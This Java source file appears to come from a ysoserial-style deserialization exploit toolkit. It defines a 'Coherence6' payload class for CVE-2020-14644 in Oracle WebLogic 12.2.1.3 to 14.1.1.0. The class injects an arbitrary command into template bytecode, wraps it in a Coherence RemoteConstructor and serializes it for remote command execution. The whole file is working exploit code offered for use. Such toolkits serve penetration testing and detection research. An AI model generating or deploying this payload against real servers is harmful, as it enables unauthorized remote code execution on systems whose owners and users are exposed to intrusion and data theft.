package payloads;

import com.tangosol.internal.util.invoke.ClassDefinition;
import com.tangosol.internal.util.invoke.ClassIdentity;
import com.tangosol.internal.util.invoke.RemoteConstructor;
import com.tangosol.internal.util.invoke.lambda.LambdaIdentity;
import common.Serializerable;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;

import java.io.InputStream;

import static util.Transformers.insertCommand;


// CVE-2020-14644 weblogic 12.2.1.4

@Dependencies({"weblogic:12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0"})
@Authors({ Authors.CCKUAILONG })
public class Coherence6 extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		InputStream in = Thread.currentThread().getContextClassLoader().getResourceAsStream("template/LambdaIdentity$423B02C050017B24DB10DFF759AA56BF.class");
		byte[] bytes = insertCommand(in, command);
		RemoteConstructor constructor = new RemoteConstructor(
				new ClassDefinition(new ClassIdentity(LambdaIdentity.class), bytes), new Object[]{}
		);

		return Serializerable.serialize(constructor);
	}

	public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
		return PayloadRunner.run(Coherence6.class, command, fusion);
	}
}
